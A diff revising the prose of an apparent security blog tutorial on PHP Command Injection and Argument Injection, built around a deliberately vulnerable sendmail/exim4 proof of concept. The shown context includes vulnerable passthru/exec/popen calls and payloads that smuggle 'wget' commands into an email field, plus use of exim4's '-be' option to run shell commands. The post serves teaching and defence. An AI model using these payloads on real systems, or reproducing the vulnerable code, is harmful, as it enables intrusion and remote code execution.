@@ -14,11 +14,11 @@ author: AlvaroFolgado
 
 ## Introduction
 
-This is the first post within the category: “Theoretical Practise”. In these series I will use information available in the internet to build a working Proof of Concept and to test dangerous functions in different languages with the objective to understand basic Web Exploitation vectors. In this chapter, I have built a Proof of Concept in relation  to the exploitation of Command Injection and Argument Injection, using PHP language. Existent PoC can be (found or obtained) [here](http://afolgado.com/poc/)
+This is the first post within the category: “Theoretical Practise”. In these series I will use information available in the Internet to build a working Proof of Concept and to test dangerous functions in different languages with the objective to understand basic Web Exploitation vectors. In this chapter, I have built a Proof of Concept in relation  to the exploitation of Command Injection and Argument Injection, using PHP language. Existent PoC can be (found or obtained) [here](http://afolgado.com/poc/)
 
 ## Command Injection VS Argument Injection
 
-Since this is the first post in which I  write about these two vulnerabilities, let  me explain in a nutshell how they work. Command Injection is possible when we provide to any kind of command interpreter as sh/bash/cmd a String directly coming from an uncontrolled user Input. Vulnerable code is as follows:
+Since this is the first post in which I talk about these two vulnerabilities, let  me explain in a nutshell how they work. Command Injection occurs when we provide to any kind of command interpreter as sh/bash/cmd a string directly coming from an uncontrolled user input. An example of vulnerable code is detailed as follows:
 
 
 ```php
@@ -28,7 +28,7 @@ passthru("/usr/bin/touch ".$userInput);
 [...]
 ```
 
-In these functions, if the user has access to the/a “$userInput” String, he or she  could perform an attack in the style:
+In these functions, if the user can control the $userInput string used by any of these functions, he or she could perform an a Command Injection attack as follows:
 
 ```bash
 ss@email.com;wget http://127.0.0.1/test
@@ -36,7 +36,7 @@ ss@email.com|wget http://127.0.0.1/test
 [...]
 ```
 
-On the other hand, an Argument Injection is different; it is triggered when an attacker injects arguments/parameters to the Executable called by these functions. When Strings from an uncontrolled user Input Source prevent the attacker from injecting shell special characters,  but only spaces. Using spaces, the attacker can forge a special string that will add arguments, parameters, or new options to the target used executable,changing the behaviour of it.
+On the other hand, an Argument Injection is different; it is triggered when an attacker injects arguments/parameters to the Executable called by these functions. This situation happens when the user input is being filtered to escape only shell special characters,or is not possible to inject them, but the injection of spaces is totally possible. By using spaces, an attacker can forge a malicious string that adds arguments, parameters, or new options to the target executable, effectively amending its behaviour.
  
 ```php
 $escapedUserInput = escapeshellcmd($userInput);
@@ -47,9 +47,9 @@ passthru("/usr/bin/touch ".$userInput);
 [...]
 ```
 
-In an Argument Injection, the ability to exploit the vulnerability depends on  the nature of the target executable. The capability to  create a successful attack vector will depend on  our knowledge of possible parameters/configurations of it. As a last resource, we could always try to perform a low level exploit in case it is a C binary or we could concatenate on other vulnerabilities in case of scripts. It all depends how deep into the rabbit hole we are willing  to go to exploit it.
+In an Argument Injection, the ability to exploit the vulnerability depends on  the nature of the target executable. The capability to  create a successful attack vector will depend on  our knowledge of possible parameters/configurations of it. As a last resource, an attacker/we could try to create a low-level exploit in case the executable is a C binary, or to concatenate other vulnerabilies if it is a script. It all depends how deep into the rabbit hole the attacker is willing to go to exploit it.
 
-A useful way to depurate Argument Injections when we know which executable is being employed is using the following bash script:
+The following bash script shows a useful way to debug Argument Injection attaks when the executable that is being employed is known / has been identified:
 
 
 ```bash
@@ -74,7 +74,7 @@ This will help us understand what is being passed from the side of the web app t
 
 ## Proof of concept: Command Injection
 
-This PoC is a simple PHP web application that uses dangerous functions to perform a call to an operating system executable (sendmail/exim4). This call is forged using an user Input as the “emailFrom”. PHP code is as follows:
+The following PoC consists in a simple PHP web application that uses dangerous functions to perform a call to the sendmail/exim4 executable. The Command Injection takes place into the $emailFrom variable as the user input is not properly sanitized
 
 ```php
 if (isset($_POST['emailFrom']) and isset($_POST['emailTo']) and isset($_POST['body']) and !strcmp($_POST['submit'],'Command Injection')){
@@ -104,9 +104,9 @@ exec("/usr/sbin/sendmail -f".$emailFrom);
 
 The way to test this Command Injection is very simple; we just provide the previous payloads in the “emailFrom” input and click Command Injection. By accessing to /var/log/apache2/access.log in the target PoC server, we can see that the “wget” command is being performed correctly.
 
-In this example anything was escaped,so the payloads were obvious. Sometimes developers will try to do create their  own escaping functions, committing errors. So trying different payloads is always recommended.
+In this example anything was escaped,so the payloads were obvious. Sometimes developers will try to mitigate these vulnerabilities by creating their own escaping functions. This usually introduces new errors that can be further exploited, so trying different payloads is always recommended.
 
-Creativity and knowledge of the sh/bash/cmd software and Operating System will allow  attackers to use complex attack vectors to exploit Command Injections. A good example of this was the famous bug [CVE-2014-6271 ShellShock](https://fedoramagazine.org/shellshock-how-does-it-actually-work/). UserInputs were provided as environmental variables, which were  was suppose to be safe, but this last bug made  it critical in some CGI servers.
+Creativity and knowledge of the sh/bash/cmd software and Operating System will allow  attackers to use complex attack vectors to exploit Command Injections. A good example of this was the famous bug [CVE-2014-6271 ShellShock](https://fedoramagazine.org/shellshock-how-does-it-actually-work/). In this case, the injection took place into system environment variables which were supposed to be safe, but this last bug made it critical in some CGI servers.
 
 
 ## Proof of concept: Argument Injection
@@ -132,9 +132,9 @@ popen("/usr/sbin/sendmail -f".$emailFrom,"r");
 ```
 
 This function will escape symbols as “;|{} …”. 
-But this php function will not escape spaces, the injection of them will be the key to exploiting the Argument Injection. As I  mentioned before, by analyzing the used executable, we are  able to obtain an exploitation vector. The target executable is “sendmail”, which  in most of Unix OS is a soft link to the target binary to study: “exim4”. Legal hackers have performed an outstanding study of it with the intention of exploitation: [PHPMAILER CVE-2016-10033](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html)
+But this php function will not escape spaces, the injection of them will be the key to exploiting the Argument Injection. As I  mentioned before, by analyzing the used executable, we are  able to obtain an exploitation vector. The target executable is “sendmail”, which  in most of Unix OS is a soft link to the target binary to study: “exim4”. Legal hackers has performed an outstanding study of it with, making his exploitation possible: [PHPMAILER CVE-2016-10033](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html)
 
-Coming  from the link above, “exim4” has  an argument “-be” that grant us access to run shell commands in the operating system. Basically, you can test run something like in bash:
+Coming  from the link above, “exim4” has  an argument “-be” that grants us access to run shell commands in the operating system. Basically, it is possible to run something like this in bash to test the functionality:
 
 
 ```bash
@@ -183,7 +183,7 @@ Received:
 Received:
 ```
 
-The space that let us performing the Argument Injection now is backfiring our ability to exploit it. An awesome study by LegalHackers about  the target binary properties let us know that we can exploit the use of characters inside environmental variables strings of exim4 (more details in  the previous link).
+The space that let us performing the Argument Injection now is backfiring our ability to exploit it. An awesome study by Legal Hackers about  the target binary properties let us know that we can exploit the use of characters inside environmental variables strings of exim4 (more details in  the previous link).
 
 ```bash
 Payload:
@@ -199,7 +199,7 @@ Received:
 Received:
 ```
 
-Finally we obtain a successful Argument Injection exploitation.
+Finally we achieve a successful Argument Injection exploitation.
 
 ## Proof of concept: 99% safe?
 
@@ -228,9 +228,9 @@ http://example.com/action?ping=<IP-STRING>
 
 We should try a series  of command Injection Payloads for a linux/windows based operating system and check  if our external server has been reached. Argument Injection is much trickier. For that, we will need to figure out vulnerable 3PP (third party library software) used by the target web application.
 
-In a **defensive** perspective, escaping correctly all inputs that go into dangerous functions is critical. We should avoid abusing  these functions to perform the application logic, but if we use it, we should be very  careful. The Dangerous Functions that I know so far will be listed [here](http://afolgado.com/researchguide/)
+From a defensive point of view, it is critical to escape any input that goes into dangerous functions. Defender should avoid abusing these functions to perform the application logic, but if he uses it, he should be very  careful. The Dangerous Functions that I know so far will be listed [here](http://afolgado.com/researchguide/)
 
-## Documentation
+## References
 
 [PHPMAILER CVE-2016-10033](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html)
 
